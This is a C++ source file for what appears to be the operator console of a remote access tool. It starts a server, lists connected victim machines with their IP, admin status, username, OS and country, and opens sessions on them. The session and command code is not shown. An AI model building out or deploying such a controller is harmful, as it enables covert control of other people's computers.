#include <iostream>
#include <EssNet.h>
#include <Essentials.h>
#include <EssCurl.h>

using namespace std;

#define MAX_CLIENTS 1000

#include "Client.h"

string Version = "2.0.0";
CLIENT Clients[MAX_CLIENTS];

#include "Classi.h"

ClientUtils* Clu;

#include "Comunicazioni.h"
#include "Funzioni.h"

int main()
{
    CLInterface cli;
    TextColor tc;
    DirUtils du;
    Settaggi settaggi;
    ConsoleUtils cu;
    WindowUtils wu;
    //SystemUtils su;
    TcpIP Server;
    Clu = new ClientUtils(settaggi);

    VectString MenuPrincipale;
    VectString HeaderTabella;
    VectString BodyTabella;

    bool CicloMenu = true;

    MenuPrincipale.push_back("Esci");
    MenuPrincipale.push_back("Connetti Sessione");
    MenuPrincipale.push_back("Crea Client");
    MenuPrincipale.push_back("Comandi Comuni");
    MenuPrincipale.push_back("Impostazioni");

    HeaderTabella.push_back("ID");
    HeaderTabella.push_back("IP");
    HeaderTabella.push_back("Ver");
    HeaderTabella.push_back("UAC");
    HeaderTabella.push_back("Nome PC");
    HeaderTabella.push_back("UserName");
    HeaderTabella.push_back("OS");
    HeaderTabella.push_back("Stato");

    if (!settaggi.GetSettings())
    {
        tc.SetColor(tc.Red);
        cout << "Errore nel caricamento delle impostazioni." << endl;
        _getch();
        return 0;
    }

    Clu->AggiornaTitolo(Clu->Menu);
    wu.SetWindowSize({ settaggi.DimensioniFinestra.X, settaggi.DimensioniFinestra.Y });

    Server.Port = settaggi.Porta;
    if (Server.StartServer() != 0)
    {
        tc.SetColor(tc.Red);
        cout << "Errore nell'avvio del server." << endl;
        Server.Stop();
        _getch();
        return 0;
    }

    thread Tconn(AccettaConnessioni, ref(Server));
    Tconn.detach();

    while (CicloMenu)
    {
        system("cls");
        StampaTitolo(1);
        cli.SubTitle("Menu Principale", 60, tc.Green);

        switch (cli.MenuSingleSelQuadre(MenuPrincipale))
        {
            // Esci
            case 0:
                // funzione per gestire la chiusura della connessione con i client attivi
                Server.Stop();
                CicloMenu = false;
                break;

            // Connetti Sessione
            case 1:
                system("cls");
                StampaTitolo(1);
                cli.SubTitle("Lista Clients", 60, tc.Green);

                BodyTabella.clear();
                for (int i = 0; i < MAX_CLIENTS; i++)
                {
                    if (Clients[i].IsConnected)
                    {
                        BodyTabella.push_back(to_string(i));
                        BodyTabella.push_back(Clients[i].info.IP);
                        BodyTabella.push_back(Clients[i].info.Versione);
                        BodyTabella.push_back( (Clients[i].info.UAC) ? "Admin" : "User" );
                        BodyTabella.push_back(Clients[i].info.PCname);
                        BodyTabella.push_back(Clients[i].info.UserName);
                        BodyTabella.push_back(Clients[i].info.OS);
                        BodyTabella.push_back(Clients[i].info.Nazione);
                    }
                }

                if (BodyTabella.size() > 0)
                {
                    int IDclient = -1;
                    bool Controllo = false;

                    cli.Table(HeaderTabella, BodyTabella);
                    cout << "\nScegli l'ID del Client.";
                    StampaPrefix(1);
                    cin >> IDclient;
                    cin.ignore();

                    if (IDclient < MAX_CLIENTS && IDclient >= 0)
                    {
                        if (Clients[IDclient].IsConnected)
                            Sessione(IDclient, Clients[IDclient].sock);
                        else
                            Controllo = true;
                    }
                    else
                        Controllo = true;

                    if(Controllo)
                    {
                        cout << "ID non valido.";
                        Sleep(2000);
                    }
                }
                else
                {
                    StampaPrefix(); cout << "Non hai Clients connessi." << endl;
                    Sleep(2000);
                }

                break;

            // Crea Client
            case 2:
                return 0;
                break;

            // Comandi Comuni
            case 3:
                return 0;
                break;

            // Impostazioni
            case 4:
                while (CicloMenu)
                {
                    system("cls");
                    StampaTitolo(1);
                    cli.SubTitle("Impostazioni", 60, tc.Green);

                    settaggi.GetSettings();

                    switch (settaggi.ShowSettings())
                    {
                        // Esci
                        case 0:
                            CicloMenu = false;
                            break;

                        // Porta
                        case 1:
                            cout << "\nInserisci la porta.";
                            StampaPrefix(1);
                            cin >> settaggi.Porta;
                            cin.ignore();
                            break;

                        // Aggiornamenti
                        case 2:
                            settaggi.VerificaAggiornamenti = !settaggi.VerificaAggiornamenti;
                            break;

                        // Colori
                        case 3:
                            //TODO implementare l'impostazione dei colori
                            break;

                        // Dimensione della finestra
                        case 4:
                            cout << "\nRidimensiona le finestra a piacimento e premi invio per salvare." << endl;
                            _getch();

                            settaggi.DimensioniFinestra.X = wu.GetWindowSize().X;
                            settaggi.DimensioniFinestra.Y = wu.GetWindowSize().Y;
                            break;
                    }

                    settaggi.SetSettings();
                }
                
                CicloMenu = true;
                break;
        }
    }

    return 0;
}